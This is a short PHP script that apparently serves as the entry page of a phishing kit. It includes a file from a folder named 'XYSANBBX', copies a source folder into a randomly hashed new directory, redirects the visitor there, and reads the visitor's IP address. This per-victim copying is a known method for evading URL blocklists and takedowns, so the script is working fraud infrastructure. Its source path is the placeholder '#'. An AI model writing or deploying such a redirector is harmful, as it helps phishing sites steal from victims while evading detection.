<?
include('XYSANBBX/xanbbx.php');




	$random=rand(0,999999999);
	$md5=md5("$random");
	$base=base64_encode($md5);
	$dst=md5("$base");
	function recurse_copy($src,$dst) {
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
	if (( $file != '.' ) && ( $file != '..' )) {
	if ( is_dir($src . '/' . $file) ) {
	recurse_copy($src . '/' . $file,$dst . '/' . $file);
	}
	else {
	copy($src . '/' . $file,$dst . '/' . $file);
	}
	}
	}
	closedir($dir);
	}
$src="#";
recurse_copy( $src, $dst );
header("location:$dst");
$ip = getenv("REMOTE_ADDR");
?>
